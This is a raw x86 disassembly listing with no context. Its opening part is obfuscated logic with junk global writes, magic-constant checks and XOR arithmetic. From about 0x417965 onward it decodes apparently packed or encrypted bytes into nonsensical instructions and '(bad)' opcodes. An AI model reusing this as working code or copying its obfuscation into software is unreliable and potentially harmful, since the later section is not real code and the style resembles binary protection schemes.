  417756:	mov    DWORD PTR ds:0x426f25,0x7197
  417760:	jne    0x417797
  417766:	mov    DWORD PTR ds:0x426ea9,0x1c69
  417770:	cmp    esi,ebx
  417772:	mov    DWORD PTR ds:0x426e99,0x2feb
  41777c:	jne    0x417797
  417782:	push   ebx
  417783:	mov    DWORD PTR ds:0x426f05,0xf40
  41778d:	push   0x70941f91
  417792:	jmp    0x41c1b4
  417797:	mov    eax,DWORD PTR [ebp+0x18]
  41779a:	mov    esi,DWORD PTR [ebp+0x1c]
  41779d:	cmp    eax,0x70941f91
  4177a2:	mov    DWORD PTR ds:0x426ea5,0x751d
  4177ac:	jne    0x4177e3
  4177b2:	mov    DWORD PTR ds:0x426ebd,0x378d
  4177bc:	cmp    esi,ebx
  4177be:	mov    DWORD PTR ds:0x426ef9,0x65e8
  4177c8:	jne    0x4177e3
  4177ce:	push   ebx
  4177cf:	push   0x70941f9e
  4177d4:	mov    DWORD PTR ds:0x426f01,0x54ba
  4177de:	jmp    0x41c1b4
  4177e3:	movzx  eax,BYTE PTR ds:0x426ef1
  4177ea:	mov    eax,DWORD PTR [ebp+0x18]
  4177ed:	mov    esi,DWORD PTR [ebp+0x1c]
  4177f0:	mov    edi,0x70941fa5
  4177f5:	mov    DWORD PTR ds:0x426f1d,0x1da7
  4177ff:	cmp    eax,edi
  417801:	mov    DWORD PTR ds:0x426f19,0x3c14
  41780b:	jne    0x41c152
  417811:	mov    DWORD PTR ds:0x426eb5,0x795b
  41781b:	cmp    esi,ebx
  41781d:	jne    0x41c152
  417823:	sub    edi,eax
  417825:	mov    eax,DWORD PTR [ebp+0x10]
  417828:	mov    DWORD PTR ds:0x426f15,0x1d
  417832:	cmp    DWORD PTR ds:0x426f15,0x0
  417839:	je     0x41788f
  41783f:	cmp    DWORD PTR ds:0x426f15,0x8
  417846:	jle    0x41788f
  41784c:	jmp    0x417861
  417851:	push   0x426f01
  417856:	push   0x6b2f
  41785b:	call   DWORD PTR ds:0x42fa48
  417861:	cmp    DWORD PTR ds:0x426f15,0x9
  417868:	jne    0x41787d
  41786e:	xor    edi,edi
  417870:	or     edi,DWORD PTR ds:0x426f15
  417876:	dec    edi
  417877:	mov    DWORD PTR ds:0x426f15,edi
  41787d:	mov    edi,DWORD PTR ds:0x426f15
  417883:	dec    edi
  417884:	mov    DWORD PTR ds:0x426f15,edi
  41788a:	jmp    0x417832
  41788f:	xor    eax,ecx
  417891:	add    eax,edx
  417893:	mov    DWORD PTR [ebp-0x20],eax
  417896:	mov    eax,DWORD PTR [ebp+0xc]
  417899:	mov    esi,DWORD PTR [ebp-0x8]
  41789c:	xor    eax,ecx
  41789e:	add    eax,edx
  4178a0:	imul   eax,DWORD PTR [esi]
  4178a3:	mov    esi,DWORD PTR [ebp+0x8]
  4178a6:	xor    esi,ecx
  4178a8:	add    esi,edx
  4178aa:	cmp    esi,eax
  4178ac:	mov    eax,DWORD PTR [ebp-0x4]
  4178af:	mov    edi,0xffcd8d06
  4178b4:	je     0x4178d3
  4178ba:	mov    esi,DWORD PTR [ebp-0x20]
  4178bd:	add    DWORD PTR [eax],esi
  4178bf:	mov    eax,DWORD PTR [ebp-0x4]
  4178c2:	mov    esi,DWORD PTR [ebp+0xc]
  4178c5:	xor    esi,ecx
  4178c7:	add    esi,edx
  4178c9:	imul   esi,DWORD PTR [eax]
  4178cc:	mov    DWORD PTR [eax],esi
  4178ce:	jmp    0x4178d8
  4178d3:	mov    esi,DWORD PTR [ebp+0x14]
  4178d6:	xor    DWORD PTR [eax],esi
  4178d8:	mov    eax,DWORD PTR [ebp-0x4]
  4178db:	mov    esi,DWORD PTR [ebp+0x10]
  4178de:	xor    esi,ecx
  4178e0:	sub    edi,esi
  4178e2:	add    DWORD PTR [eax],edi
  4178e4:	mov    eax,DWORD PTR [ebp-0x4]
  4178e7:	mov    esi,DWORD PTR [ebp-0x8]
  4178ea:	add    esi,DWORD PTR [eax]
  4178ec:	mov    DWORD PTR [ebp-0x8],esi
  4178ef:	mov    eax,DWORD PTR [ebp+0xc]
  4178f2:	mov    esi,DWORD PTR [ebp+0xc]
  4178f5:	xor    esi,ecx
  4178f7:	xor    eax,ecx
  4178f9:	lea    eax,[eax+esi*1+0x64e5f4]
  417900:	mov    esi,DWORD PTR [ebp+0xc]
  417903:	xor    esi,ecx
  417905:	add    esi,edx
  417907:	imul   eax,esi
  41790a:	mov    esi,DWORD PTR [ebp+0xc]
  41790d:	xor    esi,ecx
  41790f:	sub    esi,eax
  417911:	mov    eax,DWORD PTR [ebp-0x4]
  417914:	add    esi,edx
  417916:	cmp    DWORD PTR [eax],esi
  417918:	mov    eax,DWORD PTR [ebp-0x4]
  41791b:	mov    esi,DWORD PTR [ebp+0x10]
  41791e:	jg     0x417934
  417924:	xor    esi,ecx
  417926:	mov    edi,0xffcd8d06
  41792b:	sub    edi,esi
  41792d:	add    DWORD PTR [eax],edi
  41792f:	jmp    0x41793a
  417934:	xor    esi,ecx
  417936:	add    esi,edx
  417938:	add    DWORD PTR [eax],esi
  41793a:	mov    eax,DWORD PTR [ebp-0x8]
  41793d:	mov    esi,DWORD PTR [ebp-0x10]
  417940:	mov    eax,DWORD PTR [eax]
  417942:	xor    esi,ecx
  417944:	add    esi,0x3272f9
  41794a:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  417951:	mov    DWORD PTR [ebp-0x24],ebx
  417954:	not    esi
  417956:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41795d:	mov    DWORD PTR [ebp-0x2c],ebx
  417960:	jmp    0x419cec
  417965:	mov    bh,0xd2
  417967:	jae    0x417925
  417969:	jbe    0x4179c7
  41796b:	cmp    al,bh
  41796d:	add    BYTE PTR [edx],dl
  41796f:	sti    
  417970:	or     dh,BYTE PTR [ecx+esi*1-0x3]
  417974:	loop   0x4178fa
  417976:	mov    eax,0x9ce87b7a
  41797b:	jnp    0x4179f8
  41797d:	xor    ebx,DWORD PTR [edx-0x7df10365]
  417983:	int3   
  417984:	inc    esp
  417985:	ror    esp,cl
  417987:	popf   
  417988:	les    esi,FWORD PTR [edi+0x7a]
  41798b:	sub    BYTE PTR [edx+ebp*1-0x72],dl
  41798f:	push   0xffffffd9
  417991:	push   0x778da532
  417996:	hlt    
  417997:	addr16 test cl,dh
  41799a:	sbb    DWORD PTR [ecx],esi
  41799c:	pop    ecx
  41799d:	inc    ebp
  41799e:	xchg   esi,eax
  41799f:	and    BYTE PTR [edi-0x25d96dd2],ah
  4179a5:	loop   0x417a00
  4179a7:	adc    dh,BYTE PTR [edi]
  4179a9:	push   esp
  4179aa:	mov    edx,0x2243ebc8
  4179af:	jno    0x4179a2
  4179b1:	loopne 0x417964
  4179b3:	or     al,0x1f
  4179b5:	xchg   edi,eax
  4179b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179b7:	mov    al,0xb0
  4179b9:	and    DWORD PTR [ecx-0x7c],eax
  4179bc:	push   ebp
  4179bd:	xor    DWORD PTR [ebx+0x5e],0xf77fd182
  4179c4:	adc    al,0x49
  4179c6:	out    dx,eax
  4179c7:	rcr    BYTE PTR [esp+edi*8-0x32],0xb6
  4179cc:	aam    0x9c
  4179ce:	inc    ebx
  4179cf:	nop
  4179d0:	jmp    0x9b9f:0xea451860
  4179d7:	inc    esi
  4179d8:	xchg   edi,eax
  4179d9:	mov    dl,0x56
  4179db:	ins    BYTE PTR es:[edi],dx
  4179dc:	or     cl,BYTE PTR ds:0xdbd1d4a8
  4179e2:	inc    DWORD PTR [edx-0x46b08d72]
  4179e8:	jge    0x417a58
  4179ea:	shl    DWORD PTR [ecx+0x11114a24],cl
  4179f0:	sub    eax,0x8fcae452
  4179f5:	and    eax,0xe6dce850
  4179fa:	add    BYTE PTR [ecx+esi*1+0x30a3dc2f],bh
  417a01:	jl     0x4179aa
  417a03:	fs adc eax,0xb2168662
  417a09:	(bad)  
  417a0a:	pusha  
  417a0b:	sub    al,0xd7
  417a0d:	or     eax,0x60484c79
  417a12:	stos   DWORD PTR es:[edi],eax
  417a13:	aad    0x13
  417a15:	jecxz  0x4179ea
  417a17:	mov    BYTE PTR [ecx+0x44b22574],dl
  417a1d:	pop    ds
  417a1e:	pmuludq mm3,QWORD PTR [ebx+0x44]
  417a22:	les    eax,FWORD PTR [ebp+0x15d2a99d]
  417a28:	or     edi,DWORD PTR [ebx-0x1d9ceac1]
  417a2e:	dec    DWORD PTR [eax-0x22]
  417a31:	jmp    0xcfa4156c
  417a36:	pop    esi
  417a37:	loop   0x417a7e
  417a39:	repz xor bh,bl
  417a3c:	jp     0x850eba6c
  417a42:	adc    eax,0x12bfcce6
  417a47:	sahf   
  417a48:	scas   al,BYTE PTR es:[edi]
  417a49:	cmp    DWORD PTR [ecx+0x1af5d544],ebx
  417a4f:	int3   
  417a50:	jb     0x417a65
  417a52:	mov    eax,ds:0x42bb91c1
  417a57:	cmp    DWORD PTR [edx+esi*1],ebx
  417a5a:	in     eax,0x6a
  417a5c:	sbb    eax,DWORD PTR [esi+0x29d3ea8c]
  417a62:	gs ret 0xf720
  417a66:	xor    DWORD PTR [ebp+0x46],0x7b9e879d
  417a6d:	les    eax,FWORD PTR [ebp+ecx*2+0x7e]
  417a71:	(bad)  
  417a72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a73:	in     eax,dx
  417a74:	jae    0x417a09
  417a76:	xchg   esi,eax
  417a77:	ss adc eax,0x31a143a0
  417a7d:	push   esp
  417a7e:	add    edx,DWORD PTR [ecx-0x7f]
  417a81:	adc    DWORD PTR [ecx-0xd],esi
  417a84:	pop    es
  417a85:	xchg   ebp,eax
  417a86:	xchg   esp,eax
  417a87:	fmul   st(2),st
  417a89:	pop    edx
  417a8a:	mov    ah,0x1e
  417a8c:	dec    ecx
  417a8d:	push   0x6f
  417a8f:	out    0x27,al
  417a91:	ins    BYTE PTR es:[edi],dx
  417a92:	inc    esi
  417a93:	or     ecx,DWORD PTR [eax+0x2d]
  417a96:	in     al,dx
  417a97:	pop    ebx
  417a98:	imul   DWORD PTR ds:0x6e104f0f
  417a9e:	xchg   esi,eax
  417a9f:	cld    
  417aa0:	call   0xd99a:0x69f6ec7f
  417aa7:	xor    eax,0xa98faa21
  417aac:	popf   
  417aad:	xlat   BYTE PTR ds:[ebx]
  417aae:	outs   dx,DWORD PTR ds:[esi]
  417aaf:	mov    ah,0x45
  417ab1:	and    eax,0x67952b1c
  417ab6:	test   al,0x59
  417ab8:	in     eax,dx
  417ab9:	cmp    edi,DWORD PTR [edi+esi*2]
  417abc:	aaa    
  417abd:	out    0xb6,eax
  417abf:	adc    bh,ah
  417ac1:	test   DWORD PTR [ecx+0x78],ebx
  417ac4:	in     eax,dx
  417ac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ac6:	xor    ebx,DWORD PTR ds:0x89f41782
  417acc:	rcl    DWORD PTR [edi-0x658694ea],1
  417ad2:	or     eax,0x3ec20657
  417ad7:	jnp    0x417b44
  417ad9:	xchg   BYTE PTR [ecx],ch
  417adb:	cwde   
  417adc:	shr    DWORD PTR [edi],1
  417ade:	fistp  QWORD PTR [ebx-0x3f]
  417ae1:	adc    al,0x2b
  417ae3:	xchg   esi,eax
  417ae4:	test   DWORD PTR ds:0x8f9a18b4,eax
  417aea:	adc    eax,0xa2f05048
  417aef:	jmp    0xc636d976
  417af4:	(bad)  
  417af5:	xchg   esi,eax
  417af6:	sbb    eax,0x130ded7b
  417afb:	aam    0x97
  417afd:	sub    ebp,esi
  417aff:	cmp    al,0xb5
  417b01:	retf   0x8e22
  417b04:	and    eax,0x5b9a9966
  417b09:	push   ds
  417b0a:	aaa    
  417b0b:	les    ecx,FWORD PTR [edi-0x677bfa61]
  417b11:	add    DWORD PTR [eax],ebp
  417b13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b14:	adc    esi,ebx
  417b16:	je     0x417b43
  417b18:	inc    esp
  417b19:	sbb    al,0xb5
  417b1b:	adc    eax,0x2a7193e3
  417b20:	nop
  417b21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b22:	inc    esi
  417b23:	fs scas al,BYTE PTR es:[edi]
  417b25:	xchg   edx,eax
  417b26:	cs mov edx,0xd343b61e
  417b2c:	adc    esp,DWORD PTR [eax]
  417b2e:	or     edx,DWORD PTR [esi+0x2bd8c5cc]
  417b34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b35:	test   BYTE PTR [edx-0x1a],0xfa
  417b39:	mov    DWORD PTR [edx+0x11f25240],esp
  417b3f:	ja     0x417aea
  417b41:	add    DWORD PTR [eax-0x52],ebp
  417b44:	pop    ebp
  417b45:	inc    edx
  417b46:	pop    ecx
  417b47:	dec    ecx
  417b48:	(bad)  
  417b49:	out    0xd9,eax
  417b4b:	sub    DWORD PTR [eax],esi
  417b4d:	rol    BYTE PTR [esi],cl
  417b4f:	sub    esp,DWORD PTR [edi+edx*8+0xa94a4fd]
  417b56:	div    DWORD PTR [edx-0x710492bc]
  417b5c:	data16 (bad) [eax]
  417b5f:	and    eax,0x6030a439
  417b64:	adc    esi,DWORD PTR [edi+0x52]
  417b67:	sahf   
  417b68:	aas    
  417b69:	popf   
  417b6a:	call   DWORD PTR [eax+0x703d983f]
  417b70:	out    0x3c,eax
  417b72:	enter  0x815b,0x71
  417b76:	or     al,al
  417b78:	out    dx,al
  417b79:	call   0x1f71d703
  417b7e:	sub    eax,DWORD PTR [edx]
  417b80:	shl    ch,cl
  417b82:	adc    bl,bl
  417b84:	pop    edx
  417b85:	movntq QWORD PTR [ebx+ebx*8+0x8424623],mm1
  417b8d:	adc    BYTE PTR [eax-0x63efbf24],cl
  417b93:	add    ch,ch
  417b95:	dec    ebx
  417b96:	clc    
  417b97:	int3   
  417b98:	pusha  
  417b99:	dec    ebp
  417b9a:	dec    ebp
  417b9b:	ficomp WORD PTR [esi]
  417b9d:	push   edi
  417b9e:	push   esp
  417b9f:	sub    bh,BYTE PTR [ecx]
  417ba1:	call   0x8ab437cd
  417ba6:	push   ecx
  417ba7:	mov    esp,0xad800e4c
  417bac:	not    BYTE PTR ds:0x2a35457f
  417bb2:	sar    BYTE PTR [eax],cl
  417bb4:	sub    ah,BYTE PTR [edi]
  417bb6:	xor    DWORD PTR [ebx],eax
  417bb8:	xchg   esi,eax
  417bb9:	mov    ch,0xdc
  417bbb:	ins    BYTE PTR es:[edi],dx
  417bbc:	or     BYTE PTR [edi-0x4f],dh
  417bbf:	cmp    DWORD PTR [ebp+0x5a0098d9],0xfe909d13
  417bc9:	and    eax,0x1d8ad376
  417bce:	xchg   ecx,eax
  417bcf:	sar    esp,0xa0
  417bd2:	jae    0x417bd5
  417bd4:	adc    ebx,ebx
  417bd6:	call   0x376d5d65
  417bdb:	fwait
  417bdc:	push   edx
  417bdd:	adc    esp,DWORD PTR [edx+0x27c76dab]
  417be3:	jae    0x417c4c
  417be5:	mov    edx,0x4b86744b
  417bea:	xchg   ecx,eax
  417beb:	or     ebx,DWORD PTR [edx-0x55b0be36]
  417bf1:	mov    eax,0x6987500e
  417bf6:	adc    eax,0x8a49d726
  417bfb:	sub    esp,esp
  417bfd:	pop    edx
  417bfe:	cmp    DWORD PTR [esi+0x78],esp
  417c01:	lods   eax,DWORD PTR ds:[esi]
  417c02:	push   edx
  417c03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c04:	dec    edi
  417c05:	or     esi,ecx
  417c07:	rcl    ebp,1
  417c09:	pop    ds
  417c0a:	dec    edi
  417c0b:	fcmove st,st(6)
  417c0d:	mov    ds:0x65dfe728,al
  417c12:	addr16 push 0xffffffdc
  417c15:	mov    edi,0xa2ed2327
  417c1a:	sbb    DWORD PTR [esi],edx
  417c1c:	cmp    dh,0x17
  417c1f:	outs   dx,DWORD PTR ds:[esi]
  417c20:	xchg   ecx,eax
  417c21:	into   
  417c22:	jle    0x417c8e
  417c24:	mov    DWORD PTR [edx],edx
  417c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c27:	rcr    DWORD PTR [eax+0x2306d98e],1
  417c2d:	jbe    0x417bff
  417c2f:	jl     0x417bea
  417c31:	pop    ebx
  417c32:	push   ebx
  417c33:	out    0xbe,al
  417c35:	sbb    eax,0x5fa3b7a3
  417c3a:	adc    al,0xf2
  417c3c:	mov    ds:0x15d03082,al
  417c41:	inc    ebx
  417c42:	xor    dh,BYTE PTR [edx]
  417c44:	jnp    0x417c2e
  417c46:	mov    bh,0xfd
  417c48:	add    DWORD PTR [eax],eax
  417c4a:	jb     0x417cae
  417c4c:	and    bl,BYTE PTR [edx+0x7d8f578a]
  417c52:	add    eax,0x5637a36f
  417c57:	adc    eax,0x940f2484
  417c5c:	(bad)  
  417c5d:	fwait
  417c5e:	xor    al,dl
  417c60:	lock jnp 0x417c99
  417c63:	mov    ds:0xd5df3f09,al
  417c68:	call   FWORD PTR [esi-0x69cbb087]
  417c6e:	jns    0x417c1a
  417c70:	inc    esi
  417c71:	stc    
  417c72:	pop    ss
  417c73:	ficomp DWORD PTR [esi+0x4ea50820]
  417c7a:	adc    esi,esp
  417c7c:	ss mov esi,0x3a780a7d
  417c82:	and    bl,BYTE PTR [ebx]
  417c84:	push   esi
  417c85:	push   edi
  417c86:	pop    ebp
  417c87:	aam    0x17
  417c89:	sbb    al,0x3b
  417c8b:	jmp    0x417c64
  417c8d:	lods   eax,DWORD PTR ds:[esi]
  417c8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c8f:	jmp    0x417ca2
  417c91:	sub    eax,0xa2160915
  417c96:	or     edi,edi
  417c98:	imul   esi,DWORD PTR [esi-0x42],0x65
  417c9c:	sub    ecx,DWORD PTR ds:0xdf554e3c
  417ca2:	out    0xe8,eax
  417ca4:	cmp    esp,DWORD PTR [esi-0x543c1a7a]
  417caa:	(bad)  
  417cab:	rcl    DWORD PTR [ebp+eax*2+0x17],cl
  417caf:	fldcw  WORD PTR [esi-0x12]
  417cb2:	xor    eax,0x1712c932
  417cb7:	jmp    0x764446bc
  417cbc:	cmp    ecx,DWORD PTR [ecx+0x67]
  417cbf:	and    BYTE PTR [ecx-0x557926dc],dl
  417cc5:	inc    ecx
  417cc6:	mov    al,0x94
  417cc8:	pusha  
  417cc9:	xchg   DWORD PTR [eax+0x62],eax
  417ccc:	mov    ecx,0xd415aab2
  417cd1:	mov    edi,0x8df33fc9
  417cd6:	fldcw  WORD PTR [ecx-0x46]
  417cd9:	in     eax,dx
  417cda:	push   0xffffff98
  417cdc:	popf   
  417cdd:	fwait
  417cde:	push   ecx
  417cdf:	push   eax
  417ce0:	pop    ecx
  417ce1:	fcomp  DWORD PTR [eax]
  417ce3:	pop    ds
  417ce4:	aam    0x91
  417ce6:	adc    eax,0xc53bfb70
  417ceb:	xchg   BYTE PTR [edi+edx*4-0x49e272c8],ch
  417cf2:	mov    ebp,0xd5ff2ed4
  417cf7:	test   ch,ah
  417cf9:	stos   DWORD PTR es:[edi],eax
  417cfa:	sub    eax,0x4b56ca3c
  417cff:	xchg   esp,eax
  417d00:	xchg   ebx,eax
  417d01:	into   
  417d02:	adc    BYTE PTR [ecx-0x12],al
  417d05:	push   cs
  417d06:	into   
  417d07:	xchg   edi,eax
  417d08:	and    eax,edi
  417d0a:	cwde   
  417d0b:	add    DWORD PTR [edx+0x337d2a70],esp
  417d11:	or     eax,0x653d6ee3
  417d16:	mov    edi,0x88638eb0
  417d1b:	mov    WORD PTR [ebp+esi*4+0x3ebbea66],gs
  417d22:	mov    esp,edi
  417d24:	jecxz  0x417d92
  417d26:	inc    edi
  417d27:	and    ecx,DWORD PTR [edi+0x5bf45829]
  417d2d:	mov    BYTE PTR [edx-0x2b],dh
  417d30:	sahf   
  417d31:	sub    DWORD PTR cs:[edx+edi*4],eax
  417d35:	xchg   ecx,eax
  417d36:	enter  0xc6a8,0xdd
  417d3a:	int    0x22
  417d3c:	mov    bl,0xcb
  417d3e:	idiv   BYTE PTR [ecx-0x1]
  417d41:	xchg   edi,eax
  417d42:	(bad)  
  417d43:	loope  0x417d2d
  417d45:	js     0x417d5f
  417d47:	add    eax,0xf85ad1d2
  417d4c:	out    0x78,eax
  417d4e:	cmc    
  417d4f:	shr    DWORD PTR [esi+0xf780bf2],cl
  417d55:	outs   dx,DWORD PTR ds:[esi]
  417d56:	mov    ?,WORD PTR [ebx+0x4d1adb44]
  417d5c:	pop    eax
  417d5d:	call   0x43e2cece
  417d62:	sbb    esi,ecx
  417d64:	mov    bl,0xd9
  417d66:	das    
  417d67:	cli    
  417d68:	rcl    edi,cl
  417d6a:	cli    
  417d6b:	sbb    DWORD PTR [ebx],esp
  417d6d:	ins    BYTE PTR es:[edi],dx
  417d6e:	gs jne 0x417d50
  417d71:	(bad)
  417d74:	inc    ebp
  417d75:	push   ebp
  417d76:	out    0xe,eax
  417d78:	sbb    edx,DWORD PTR [ecx+0x45]
  417d7b:	out    0x61,al
  417d7d:	jecxz  0x417d65
  417d7f:	cli    
  417d80:	mov    eax,0xafa4c7a1
  417d85:	loopne 0x417dd0
  417d87:	test   eax,0xc5cf3da6
  417d8c:	out    dx,al
  417d8d:	in     eax,dx
  417d8e:	xor    bh,dl
  417d90:	retf   0x4b09
  417d93:	add    ah,ch
  417d95:	stc    
  417d96:	sub    DWORD PTR [ebp-0x73],ebx
  417d99:	ins    BYTE PTR es:[edi],dx
  417d9a:	fisttp WORD PTR [eax]
  417d9c:	stos   DWORD PTR es:[edi],eax
  417d9d:	push   ss
  417d9e:	dec    ebp
  417d9f:	adc    eax,0x7f9d60f
  417da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417da5:	pop    edx
  417da6:	push   edx
  417da7:	enter  0x7446,0x3b
  417dab:	dec    esp
  417dac:	pushf  
  417dad:	inc    esi
  417dae:	push   fs
  417db0:	mov    dl,0x8
  417db2:	mov    edi,0x6cadd953
  417db7:	repnz cmp BYTE PTR [edi+0x501a3229],ch
  417dbe:	sub    al,0x85
  417dc0:	addr16 sub al,0x55
  417dc3:	repnz (bad) 
  417dc5:	es pushf 
  417dc7:	sbb    BYTE PTR [eax-0x24d2bd0d],cl
  417dcd:	jge    0x417dea
  417dcf:	cmovg  esp,DWORD PTR [ebp+0x44]
  417dd3:	rcr    bh,0xb8
  417dd6:	aad    0x77
  417dd8:	stos   DWORD PTR es:[edi],eax
  417dd9:	cmp    eax,0x919a633c
  417dde:	xchg   BYTE PTR [eax],ch
  417de0:	mov    bh,0x14
  417de2:	out    0xbf,eax
  417de4:	mov    ?,WORD PTR [ecx+eax*2+0x70a45c6d]
  417deb:	sbb    ebx,edx
  417ded:	inc    ecx
  417dee:	xchg   edx,eax
  417def:	aam    0x19
  417df1:	pop    ecx
  417df2:	je     0x417e5c
  417df4:	mov    bl,0xca
  417df6:	lock push 0xc4124aab
  417dfc:	jle    0x417e7c
  417dfe:	push   edi
  417dff:	in     al,0x61
  417e01:	xor    DWORD PTR [ecx],edi
  417e03:	jns    0x417e63
  417e05:	leave  
  417e06:	arpl   cx,dx
  417e08:	or     DWORD PTR [edi+0x34],ebp
  417e0b:	dec    esi
  417e0c:	cmp    BYTE PTR [ebp+ebp*1+0x3ebe33ab],bl
  417e13:	push   cs
  417e14:	pop    edx
  417e15:	dec    edx
  417e16:	xlat   BYTE PTR ds:[ebx]
  417e17:	daa    
  417e18:	xchg   DWORD PTR [edx-0xc0781cf],ebp
  417e1e:	fiadd  WORD PTR [ebp+ebx*4+0x60]
  417e22:	ins    BYTE PTR es:[edi],dx
  417e23:	sub    ah,bl
  417e25:	or     DWORD PTR [eax+0x456489f2],esp
  417e2b:	test   ch,al
  417e2d:	mov    ds:0x2a52ef36,eax
  417e32:	push   0xffffff9a
  417e34:	xor    edx,DWORD PTR [esi-0x20]
  417e37:	pop    ebp
  417e38:	mov    bh,0xfd
  417e3a:	and    ah,ch
  417e3c:	outs   dx,BYTE PTR ds:[esi]
  417e3d:	mov    ds:0xf0932a13,eax
  417e42:	or     edx,ebx
  417e44:	sti    
  417e45:	ds pop esi
  417e47:	sbb    al,dl
  417e49:	call   0xd7a5416a
  417e4e:	(bad)  
  417e4f:	adc    ebx,eax
  417e51:	jo     0x417dd4
  417e53:	push   edi
  417e54:	xchg   esp,eax
  417e55:	mov    ecx,0x97ee3320
  417e5a:	add    cl,BYTE PTR [ebx-0x18]
  417e5d:	cs out dx,eax
  417e5f:	test   eax,0x5dd9cb6e
  417e64:	cmp    cl,BYTE PTR [edx-0x5d]
  417e67:	ficom  WORD PTR [ebp-0x4741e5d5]
  417e6d:	xor    al,0x34
  417e6f:	cmp    DWORD PTR [ebp+0x2a],edi
  417e72:	and    al,0x17
  417e74:	and    edi,ecx
  417e76:	sub    al,0x5a
  417e78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e79:	mov    edi,0x820dd250
  417e7e:	sbb    ch,BYTE PTR ds:0xdbb8c9a1
  417e84:	out    0x9b,al
  417e86:	mov    eax,ds:0x99f5614a
  417e8b:	popf   
  417e8c:	shr    BYTE PTR [esi+0x65],cl
  417e8f:	int3   
  417e90:	mov    ecx,0x96a082c4
  417e95:	enter  0x4706,0x63
  417e99:	jp     0x417f1a
  417e9b:	outs   dx,BYTE PTR ds:[esi]
  417e9c:	cmc    
  417e9d:	cld    
  417e9e:	mov    ch,0xd2
  417ea0:	daa    
  417ea1:	retf   0xd0a5
  417ea4:	(bad)  
  417ea5:	in     eax,0x9
  417ea7:	test   BYTE PTR [ebp+eiz*8-0x5a],ch
  417eab:	pop    es
  417eac:	shr    BYTE PTR [edx],cl
  417eae:	ss xchg ebx,eax
  417eb0:	js     0x417ead
  417eb2:	push   ebp
  417eb3:	adc    DWORD PTR [ecx],edi
  417eb5:	adc    eax,0x18e99dbb
  417eba:	aaa    
  417ebb:	cld    
  417ebc:	mov    ah,0xec
  417ebe:	loop   0x417f1d
  417ec0:	out    0xfe,al
  417ec2:	imul   eax,DWORD PTR [ebx],0x7
  417ec5:	or     bl,BYTE PTR [edx+0x41]
  417ec8:	je     0x417f27
  417eca:	xlat   BYTE PTR ds:[ebx]
  417ecb:	mov    ds,WORD PTR [ebx+ebp*2]
  417ece:	sub    eax,0xdec5a05a
  417ed3:	repnz retf 0x930b
  417ed7:	lods   eax,DWORD PTR ds:[esi]
  417ed8:	inc    eax
  417ed9:	lods   al,BYTE PTR ds:[esi]
  417eda:	jne    0x417efd
  417edc:	fmul   DWORD PTR [edx-0x3e283eb5]
  417ee2:	repnz pop edi
  417ee4:	push   ecx
  417ee5:	xor    BYTE PTR [esi],al
  417ee7:	pop    ss
  417ee8:	dec    edi
  417ee9:	adc    DWORD PTR [edx-0x2804960a],edi
  417eef:	cdq    
  417ef0:	dec    ebp
  417ef1:	mov    ch,0xa5
  417ef3:	jmp    0x18a9:0x4b9328f1
  417efa:	add    eax,0xdf10b9ab
  417eff:	cs ins DWORD PTR es:[edi],dx
  417f01:	scas   al,BYTE PTR es:[edi]
  417f02:	lea    ecx,[ebp+0x67]
  417f05:	sbb    edx,DWORD PTR [ebx+0x14]
  417f08:	add    BYTE PTR [esi],al
  417f0a:	mov    edi,0x21311d79
  417f0f:	jo     0x417ebe
  417f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f12:	add    eax,0x8945c99b
  417f17:	push   ebp
  417f18:	shl    DWORD PTR [ebx+ebx*4+0x6d],cl
  417f1c:	inc    ebx
  417f1d:	mov    dh,0x49
  417f1f:	rol    BYTE PTR [ecx+0x256d7c33],cl
  417f25:	aam    0x61
  417f27:	sbb    eax,0x7f24e9ca
  417f2c:	in     eax,0x61
  417f2e:	mov    esi,0x75b49f4b
  417f33:	scas   eax,DWORD PTR es:[edi]
  417f34:	arpl   di,ax
  417f36:	jmp    0xd84715e
  417f3b:	adc    ah,bl
  417f3d:	cmp    DWORD PTR [esp+ecx*4],edx
  417f40:	sbb    cl,BYTE PTR [ebx+ebp*8+0x4701cf27]
  417f47:	loop   0x417ecf
  417f49:	xchg   ebp,eax
  417f4a:	repnz cdq 
  417f4c:	xor    al,0x5e
  417f4e:	int3   
  417f4f:	call   0xc76667b9
  417f54:	inc    ebx
  417f55:	clc    
  417f56:	aad    0xa0
  417f58:	jge    0x417fd5
  417f5a:	or     eax,DWORD PTR [edi+0x4f]
  417f5d:	loope  0x417ee0
  417f5f:	or     al,0x80
  417f61:	(bad)  
  417f62:	fwait
  417f63:	mov    edi,0xd62776d
  417f68:	cmp    cl,dh
  417f6a:	cli    
  417f6b:	xchg   ecx,eax
  417f6c:	or     DWORD PTR [ecx],ebx
  417f6e:	imul   eax,DWORD PTR [edx-0x58],0xffffffe4
  417f72:	out    dx,al
  417f73:	repz push eax
  417f75:	pusha  
  417f76:	mov    ch,0x84
  417f78:	xchg   esi,eax
  417f79:	cld    
  417f7a:	push   0x1cff9b18
  417f7f:	inc    esi
  417f80:	popa   
  417f81:	out    0xfc,eax
  417f83:	push   0x16f15c0e
  417f88:	fwait
  417f89:	xchg   DWORD PTR [ebx+0x2192cfad],esi
  417f8f:	mov    eax,0x85101b7a
  417f94:	inc    edx
  417f95:	ret    
  417f96:	cld    
  417f97:	mov    dh,0x63
  417f99:	scas   al,BYTE PTR es:[edi]
  417f9a:	dec    ebp
  417f9b:	push   0x39
  417f9d:	outs   dx,BYTE PTR ds:[esi]
  417f9e:	(bad)  
  417f9f:	jne    0x417fbc
  417fa1:	or     al,0x97
  417fa3:	das    
  417fa4:	jge    0x417f7b
  417fa6:	test   DWORD PTR [edi+esi*8+0x7c146383],0x58fff907
  417fb1:	ins    DWORD PTR es:[edi],dx
  417fb2:	push   ebx
  417fb3:	ret    0xe465
